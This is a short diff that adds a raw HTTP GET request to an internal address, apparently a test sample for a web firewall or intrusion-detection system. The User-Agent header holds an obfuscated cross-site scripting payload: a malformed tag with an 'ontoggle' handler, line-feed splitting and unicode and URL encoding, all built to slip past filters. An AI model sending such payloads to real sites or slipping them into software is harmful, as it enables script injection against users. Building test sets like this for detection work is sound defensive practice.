@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: <detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
